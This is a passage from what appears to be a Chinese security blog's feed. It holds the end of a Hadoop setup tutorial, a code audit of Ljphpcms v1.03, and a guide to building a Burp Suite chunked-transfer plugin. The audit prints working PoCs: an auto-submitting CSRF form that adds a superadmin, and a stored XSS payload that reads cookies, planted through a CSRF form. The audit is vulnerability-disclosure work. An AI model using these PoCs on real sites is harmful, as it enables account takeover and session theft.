href="#测试本地免密登陆" class="headerlink" title="测试本地免密登陆"></a>测试本地免密登陆</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh localhost</span></span><br></pre></td></tr></table></figure><p>配置成功则无需密码直接登陆成功<br><img src="https://i.loli.net/2019/03/25/5c98cebc70764.png" alt></p><p>如果失败请使用<code>ssh -vvv locoalhost</code>进行debug排查</p><h2 id="0x04-配置hadoop伪分布式集群"><a href="#0x04-配置hadoop伪分布式集群" class="headerlink" title="0x04 配置hadoop伪分布式集群"></a>0x04 配置hadoop伪分布式集群</h2><h3 id="配置hadoop运行核心文件core-site-xml"><a href="#配置hadoop运行核心文件core-site-xml" class="headerlink" title="配置hadoop运行核心文件core-site.xml"></a>配置hadoop运行核心文件core-site.xml</h3><p><img src="https://i.loli.net/2019/03/26/5c997b8d76114.png" alt><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.defaultFS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://localhost:9000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="配置HDFS分布式储存的配置hdfs-site-xml"><a href="#配置HDFS分布式储存的配置hdfs-site-xml" class="headerlink" title="配置HDFS分布式储存的配置hdfs-site.xml"></a>配置HDFS分布式储存的配置hdfs-site.xml</h3><p><img src="https://i.loli.net/2019/03/26/5c997bdaadc4d.png" alt><br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;configuration&gt;</span></span><br><span class="line">        <span class="params">&lt;property&gt;</span></span><br><span class="line">                <span class="params">&lt;name&gt;</span>dfs.replication<span class="params">&lt;/name&gt;</span></span><br><span class="line">                <span class="params">&lt;value&gt;</span><span class="number">1</span><span class="params">&lt;/value&gt;</span></span><br><span class="line">        <span class="params">&lt;/property&gt;</span></span><br><span class="line">        <span class="params">&lt;property&gt;</span></span><br><span class="line">                <span class="params">&lt;name&gt;</span>dfs.name.dir<span class="params">&lt;/name&gt;</span></span><br><span class="line">                <span class="params">&lt;value&gt;</span><span class="meta-keyword">/home/</span>wzb<span class="meta-keyword">/hdfs-data/</span>name<span class="params">&lt;/value&gt;</span></span><br><span class="line">        <span class="params">&lt;/property&gt;</span></span><br><span class="line">        <span class="params">&lt;property&gt;</span></span><br><span class="line">                <span class="params">&lt;name&gt;</span>dfs.data.dir<span class="params">&lt;/name&gt;</span></span><br><span class="line">                <span class="params">&lt;value&gt;</span><span class="meta-keyword">/home/</span>wzb<span class="meta-keyword">/hdfs-data/</span>data<span class="params">&lt;/value&gt;</span></span><br><span class="line">        <span class="params">&lt;/property&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="params">&lt;/configuration&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="数据目录格式化"><a href="#数据目录格式化" class="headerlink" title="数据目录格式化"></a>数据目录格式化</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hdfs namenode -<span class="built_in">format</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/03/25/5c98d15646d0a.png" alt><br>出现<code>INFO common.Storage: Storage directory /home/wzb/hdfs-data/name has been successfully formatted.</code>字样时表明格式化目录成功</p><h3 id="启动Hadoop"><a href="#启动Hadoop" class="headerlink" title="启动Hadoop"></a>启动Hadoop</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start-<span class="keyword">all</span>.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/03/25/5c98d2022c1ba.png" alt><br>启动过程中下面进程无错误启动即启动成功。<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Starting namenodes</span></span><br><span class="line"><span class="attribute">Starting datanodes</span></span><br><span class="line"><span class="attribute">Starting secondary namenodes</span></span><br><span class="line"><span class="attribute">Starting resourcemanager</span></span><br><span class="line"><span class="attribute">Starting nodemanagers</span></span><br></pre></td></tr></table></figure></p><h3 id="查看java进程"><a href="#查看java进程" class="headerlink" title="查看java进程"></a>查看java进程</h3><p>使用命令<code>jps</code>可发现相关进程启动成功<br><img src="https://i.loli.net/2019/03/26/5c997c6d6997c.png" alt></p><h3 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h3><p><code>netstat -ntpl |grep java</code><br>可与上面进程号比对查看相关进程部署在哪个端口。<br><img src="https://i.loli.net/2019/03/26/5c997c841fa19.png" alt></p><h3 id="访问端口"><a href="#访问端口" class="headerlink" title="访问端口"></a>访问端口</h3><p><code>http://127.0.0.1:8088</code><br><img src="https://i.loli.net/2019/03/25/5c98d3b4a5353.png" alt></p><p><code>http://127.0.0.1:9870</code><br><img src="https://i.loli.net/2019/03/26/5c997d2136881.png" alt></p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>本地搭建伪分布式会面临设备关机重启，请在关机前执行<code>stop-all.sh</code>关闭所有相关进程。</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>在配置环节可能出现多处未知错误，可通过排查log记录解决。<br>如免密登陆及部署hadoop时可能会出现未知错误。</p><ul><li>免密登陆出现的错误可通过<code>ssh -vvv localhost</code>查看debug情况，进行相应错误的处理。</li><li>部署hadoop过程中，如有关进程未正常启动可通过hadoop目录下的logs文件查看启动失败的进程log,进行相应处理。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Apache Hadoop是一款支持数据密集型分布式应用程序并以Apache 2.0许可协议发布的开
      
    
    </summary>
    
      <category term="环境配置" scheme="https://zhengbao.wang/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="hadoop" scheme="https://zhengbao.wang/tags/hadoop/"/>
    
  </entry>
  
  <entry>
    <title>Ljphpcms_v1.03代码审计之csrf&amp;&amp;xss</title>
    <link href="https://zhengbao.wang/Ljphpcms-v1-03%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bcsrf-xss/"/>
    <id>https://zhengbao.wang/Ljphpcms-v1-03代码审计之csrf-xss/</id>
    <published>2019-03-21T13:12:06.000Z</published>
    <updated>2019-03-23T13:33:49.581Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>此次审计为Ljphpcms_v1.03最新版<br>demo:<a href="http://demo.8cms.com/" target="_blank" rel="noopener">http://demo.8cms.com/</a><br><img src="https://i.loli.net/2019/03/21/5c9337aaacc5b.png" alt></p><h2 id="0x01-CSRF添加超级管理员"><a href="#0x01-CSRF添加超级管理员" class="headerlink" title="0x01 CSRF添加超级管理员"></a>0x01 CSRF添加超级管理员</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>后台多处操纵存在可利用的CSRF,这里以添加超级管理为例。<br>在后台<code>/admincp.php?c=admin&amp;a=add</code>处可以添加超级管理员。<br><img src="https://i.loli.net/2019/03/21/5c93384258d51.png" alt><br>在添加管理员过程中，进验证了权限，未作其他防御CSRF措施<br><img src="https://i.loli.net/2019/03/21/5c93404cc58c8.png" alt></p><h3 id="添加管理员"><a href="#添加管理员" class="headerlink" title="添加管理员"></a>添加管理员</h3><p>测试通过csrf添加管理员<br>测试之前数据库内容<br><img src="https://i.loli.net/2019/03/21/5c93087e71bd3.png" alt><br>测试之后，成功添加<code>l3oog1e</code>用户<br><img src="https://i.loli.net/2019/03/21/5c9308c066c14.png" alt></p><h3 id="CSRF-POC"><a href="#CSRF-POC" class="headerlink" title="CSRF POC"></a>CSRF POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">"width:0;height:0;border:0; border:none;"</span> <span class="attr">name</span>=<span class="string">"csrf-frame"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"adduser"</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/Ljphpcms_V1.03/admincp.php?c=admin&amp;a=saveadd"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">target</span>=<span class="string">"csrf-frame"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"adminname"</span> <span class="attr">value</span>=<span class="string">"l3oog1e"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"123123"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"confirmpassword"</span> <span class="attr">value</span>=<span class="string">"123123"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"flag"</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"groupid"</span> <span class="attr">value</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"memo"</span> <span class="attr">value</span>=<span class="string">"csrf_test"</span>&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.forms.adduser.submit();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-后台存储型xss"><a href="#0x02-后台存储型xss" class="headerlink" title="0x02 后台存储型xss"></a>0x02 后台存储型xss</h2><h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p>问题出现在后台站点设置处<code>http://127.0.0.1/Ljphpcms_V1.03/admincp.php?c=setting&amp;a=run</code><br>在<code>\source\control\admincp\setting.php</code>中，对站点设置提交的内容进行了接收处理。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action_savebase</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;checkAuth(<span class="string">'savebase'</span>);</span><br><span class="line">    $args = <span class="keyword">array</span>();</span><br><span class="line">    $args = <span class="keyword">$this</span>-&gt;_validBase();</span><br><span class="line">    $model = <span class="keyword">parent</span>::model(<span class="string">'setting'</span>, <span class="string">'am'</span>);</span><br><span class="line">  <span class="comment">//  print_r($args);die;</span></span><br><span class="line">            $optionname=<span class="string">'site_base'</span>;</span><br><span class="line">    $lang= <span class="keyword">parent</span>::$lang;      </span><br><span class="line">    <span class="keyword">if</span>($lang!=<span class="string">'cn'</span>)&#123;</span><br><span class="line">        $optionname=$optionname.<span class="string">"_"</span>.$_SESSION[<span class="string">'lang'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    $tjcode=$args[<span class="string">'tjcode'</span>];</span><br><span class="line">    <span class="keyword">unset</span>($args[<span class="string">'tjcode'</span>]);</span><br><span class="line">    $result = $model-&gt;doSave($optionname, $args,$tjcode);</span><br><span class="line">    <span class="keyword">unset</span>($model);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $result) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;log(<span class="string">'setting'</span>, <span class="string">'站点设置'</span>, <span class="number">1</span>);</span><br><span class="line">        XHandle::halt(<span class="string">'保存成功'</span>, <span class="keyword">$this</span>-&gt;cpfile.<span class="string">'?c=setting'</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;log(<span class="string">'setting'</span>, <span class="string">'站点设置'</span>, <span class="number">0</span>);</span><br><span class="line">        XHandle::halt(<span class="string">'保存失败'</span>, <span class="string">''</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>代码中<code>$args = $this-&gt;_validBase();</code>接受到的是全部内容<br><img src="https://i.loli.net/2019/03/22/5c9496d2717af.png" alt><br>但是在下面，又通过<code>$tjcode=$args[&#39;tjcode&#39;];</code>把<code>tjcode</code>内容单出提取出来了。<br><img src="https://i.loli.net/2019/03/22/5c9496f5cd48d.png" alt></p><p>然后进入到<code>$result = $model-&gt;doSave($optionname, $args,$tjcode);</code><br>跟进<code>doSave</code>操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doSave</span><span class="params">($option, $array,$tjcode)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    $data = serialize($array);</span><br><span class="line">    <span class="keyword">if</span>($option==<span class="string">"site_base"</span> || $option==<span class="string">"site_base_en"</span>)&#123;</span><br><span class="line">          <span class="keyword">parent</span>::loadLib(<span class="string">'option'</span>);</span><br><span class="line">         XOption::updateOption1($option, $data,$tjcode);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">parent</span>::loadLib(<span class="string">'option'</span>);</span><br><span class="line">         XOption::updateOption($option, $data);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>看以看到这里其他内容进行了序列化处理，而<code>tjcode</code>却没进行任何处理，之后便进入<code>XOption::updateOption1($option, $data,$tjcode);</code>执行更新操作。<br>跟进<code>updateOption1</code>,发现<code>tjcode</code>依旧没做任何处理<br><img src="https://i.loli.net/2019/03/22/5c9497dd5a077.png" alt></p><h3 id="盗取cookie"><a href="#盗取cookie" class="headerlink" title="盗取cookie"></a>盗取cookie</h3><p>上面说到的<code>tjcode</code>即为流量统计代码处的内容<br>在流量统计代码处插入xss脚本<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">poc </span><br><span class="line">boogle<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/22/5c94571c7c580.png" alt><br>执行更新操作，查看数据库，已被插入xss脚本<br><img src="https://i.loli.net/2019/03/22/5c9458709df5a.png" alt></p><p>当不同用户登陆时</p><p>用户<code>boogle</code><br><img src="https://i.loli.net/2019/03/22/5c9457b3cc2bf.png" alt><br>管理员<br><img src="https://i.loli.net/2019/03/22/5c945823470dc.png" alt></p><h2 id="0x03-SSRF、XSS结合"><a href="#0x03-SSRF、XSS结合" class="headerlink" title="0x03 SSRF、XSS结合"></a>0x03 SSRF、XSS结合</h2><p>后台的XSS，还是有些鸡肋，普通用户可能并不具备修改站点设置的权限。这里结合前面的csrf<br>poc<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;html&gt;</span></span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  <span class="symbol">&lt;body&gt;</span></span><br><span class="line">  <span class="symbol">&lt;script&gt;</span><span class="keyword">history</span>.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)&lt;/script&gt;</span><br><span class="line">    &lt;form action=<span class="string">"http://127.0.0.1/Ljphpcms_V1.03/admincp.php?c=setting"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"a"</span> value=<span class="string">"savebase"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"sitename"</span> value=<span class="string">"�&amp;#137;&amp;#175;�&amp;#178;&amp;#190;PHP�&amp;#188;&amp;#129;�&amp;#184;&amp;#154;�&amp;#189;&amp;#145;�&amp;#171;&amp;#153;�&amp;#174;&amp;#161;�&amp;#144;&amp;#134;�&amp;#179;&amp;#187;�&amp;#187;&amp;#159;"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"siteurl"</span> value=<span class="string">"http&amp;#58;&amp;#47;&amp;#47;localhost&amp;#47;ljcms&amp;#47;"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"icpcode"</span> value=<span class="string">"浜&amp;#172;ICP�&amp;#164;&amp;#135;08002262�&amp;#143;&amp;#183;"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"sitephone"</span> value=<span class="string">"010&amp;#45;81991660"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"siteqq"</span> value=<span class="string">"1665976568"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"siteemail"</span> value=<span class="string">"82993936&amp;#64;qq&amp;#46;com"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"siteaddress"</span> value=<span class="string">"�&amp;#140;&amp;#151;浜&amp;#172;�&amp;#184;&amp;#130;�&amp;#184;&amp;#176;�&amp;#143;&amp;#176;�&amp;#140;虹&amp;#167;&amp;#145;�&amp;#138;&amp;#128;�&amp;#155;&amp;#173;�&amp;#175;哄&amp;#190;&amp;#183;�&amp;#184;&amp;#173;�&amp;#191;&amp;#131;4�&amp;#143;&amp;#183;�&amp;#165;&amp;#188;"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"longitude"</span> value=<span class="string">"116&amp;#46;304724"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"latitude"</span> value=<span class="string">"39&amp;#46;835519"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"tjcode"</span> value=<span class="string">"boogle&lt;/textarea&gt;&lt;script&gt;alert('boogle')&lt;/script&gt;"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"qrcode"</span> value=<span class="string">"http&amp;#58;&amp;#47;&amp;#47;pic49&amp;#46;nipic&amp;#46;com&amp;#47;file&amp;#47;20140926&amp;#47;9422602&amp;#95;102539153000&amp;#95;2&amp;#46;jpg"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"logo"</span> value=<span class="string">"data&amp;#47;attachment&amp;#47;201811&amp;#47;01&amp;#47;0b4affc887ed2b08&amp;#46;png"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"logowidth"</span> value=<span class="string">"232"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"logoheight"</span> value=<span class="string">"60"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"btn&amp;#95;save"</span> value=<span class="string">"�&amp;#155;&amp;#180;�&amp;#150;&amp;#176;�&amp;#191;&amp;#157;�&amp;#173;&amp;#152;"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"submit"</span> value=<span class="string">"Submit request"</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><h2 id="0x04-修复方式"><a href="#0x04-修复方式" class="headerlink" title="0x04 修复方式"></a>0x04 修复方式</h2><p>增加防御csrf的验证<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">token</span>、referer、验证码</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;此次审计为Ljphpcms_v1.03最新版&lt;br&gt;demo:&lt;a href=&quot;http://dem
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="https://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="0day挖掘" scheme="https://zhengbao.wang/tags/0day%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>burpsuite安装分块传输插件</title>
    <link href="https://zhengbao.wang/burpsuite%E5%AE%89%E8%A3%85%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E6%8F%92%E4%BB%B6/"/>
    <id>https://zhengbao.wang/burpsuite安装分块传输插件/</id>
    <published>2019-03-18T02:14:07.000Z</published>
    <updated>2019-03-18T02:22:10.065Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>关于分块传输的用处不多解释，感谢c0ny1编写的自动化插件,项目地址：<a href="https://github.com/c0ny1/chunked-coding-converter" target="_blank" rel="noopener">https://github.com/c0ny1/chunked-coding-converter</a></p><h2 id="0x02-mvn-package"><a href="#0x02-mvn-package" class="headerlink" title="0x02 mvn package"></a>0x02 mvn package</h2><h3 id="命令打包"><a href="#命令打包" class="headerlink" title="命令打包"></a>命令打包</h3><p>下载完成后可直接在<code>pom.xml</code>根目录执行<code>mvn package</code>进行打包，成功后生成一个<code>target</code>文件夹，里面有打包好的burpsuite插件。</p><h3 id="IDE打包"><a href="#IDE打包" class="headerlink" title="IDE打包"></a>IDE打包</h3><p>我这里就用的<code>myeclipse</code>。这里简述一下步骤<br>首先通过<code>file-&gt;import</code>导入目标，选择<code>Existing Maven Projects</code><br><img src="https://i.loli.net/2019/03/18/5c8ef5589fe5a.png" alt><br>执行下一步，选择下载好的包含<code>pom.xml</code>的上级目录即可<br><img src="https://i.loli.net/2019/03/18/5c8ef614e87b5.png" alt><br>然后稍等一会即可在<code>Packahe Explorer</code>视图中看到整个项目<br><img src="https://i.loli.net/2019/03/18/5c8ef65fbfb83.png" alt><br>然后在<code>pom.xml</code>上右键执行<code>run as-&gt;maven package</code>操作。<br>如果没有<code>maven package</code>操作可以选择<code>maven build</code>，新建一个，填写Goals为package<br><img src="https://i.loli.net/2019/03/18/5c8ef75b39b21.png" alt><br>然后等待其打包完成即可，完成后在target目录中机会生成目标<code>.jar</code>文件<br><img src="https://i.loli.net/2019/03/18/5c8ef83018b3c.png" alt></p><p>然后启动burpsuite，执行插件添加操作，选择刚才打包好的jar文件<br><img src="https://i.loli.net/2019/03/18/5c8ef868ba29d.png" alt></p><p>安装成功会有提示<br><img src="https://i.loli.net/2019/03/18/5c8ef8c54ec3f.png" alt><br>然后就可以享受这一利器带来的便利了<br><img src="https://i.loli.net/2019/03/18/5c8ef9079e7cc.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;关于分块传输的用处不多解释，感谢c0ny1编写的自动化插件,项目地址：&lt;a href=&quot;https:
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="burpsuite" scheme="https://zhengbao.wang/tags/burpsuite/"/>
    
  </entry>
  
  <entry>
    <title>semcms_php_v3.8任意文件刪除</title>
    <link href="https://zhengbao.wang/semcms-php-v3-8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%AA%E9%99%A4/"/>
    <id>https://zhengbao.wang/semcms-php-v3-8任意文件刪除/</id>
    <published>2019-03-16T08:24:25.000Z</published>
    <updated>2019-03-25T00:35:07.786Z</updated>
    
